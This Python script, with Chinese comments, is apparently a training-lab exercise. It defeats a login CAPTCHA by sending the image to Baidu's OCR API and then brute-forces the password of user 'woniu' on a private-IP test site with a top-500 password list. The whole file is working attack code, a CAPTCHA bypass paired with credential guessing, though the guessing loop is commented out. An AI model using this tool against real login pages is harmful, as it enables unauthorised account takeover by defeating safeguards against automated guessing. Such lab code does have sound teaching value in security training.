import time

import requests, base64

def baidu_token():
    client_id = 'XXXXXXXXXXXXXXXXXXXXX'  # API Key
    client_secret = 'XXXXXXXXXXXXXXXXXXXX'   # Secret Key
    host = f'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id={client_id}&client_secret={client_secret}'
    response = requests.get(host)
    print(response.text)

# 测试OCR识别结果
def baidu_ocr():
    request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"

    f = open('D:/vcode.png', 'rb')
    img = base64.b64encode(f.read())

    params = {"image": img}
    access_token = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
    request_url = request_url + "?access_token=" + access_token
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    response = requests.post(request_url, data=params, headers=headers)
    print(response.text)

# 利用OCR实现爆破
def burst_login(password):
    # 虽然百度接口可以直接读取验证码的URL地址，但是内网IP不行
    # data = {'url': 'http://192.168.112.188/security/vcode.php'}

    session = requests.session()

    # 先获取验证码图片的二进制数据
    resp_vcode = session.get('http://192.168.112.188/security/vcode.php')
    img = base64.b64encode(resp_vcode.content)

    # 交给百度OCR识别
    params = {"image": img}
    access_token = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx'
    baidu_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
    baidu_url = baidu_url + "?access_token=" + access_token
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    resp_baidu = requests.post(baidu_url, data=params, headers=headers)
    vcode = '0000'
    if resp_baidu:
        vcode = resp_baidu.json()['words_result'][0]['words']

    # 进行登录的爆破
    data = {'username':'woniu', 'password': password, 'vcode': vcode}
    login_url = 'http://192.168.112.188/security/login-3.php'
    resp = session.post(url=login_url, data=data)
    if 'vcode-error' in resp.text:
        # 直接将验证码出错时的密码输出，然后等本轮爆破完，再对验证码出错的密码进行爆破
        print(f'验证码出错: {data}')
        # 将密码写入到一个新的文件中，进行第二轮爆破
    else:
        if ("login-fail" not in resp.text):
            print(f'登录成功，Payload为：{data}')


if __name__ == '__main__':
    # baidu_token()
    baidu_ocr()

    # with open('../dict/password-top500.txt') as file:
    #     pass_list = file.readlines()
    #
    # for password in pass_list:
    #     burst_login(password.strip())
    #     time.sleep(2)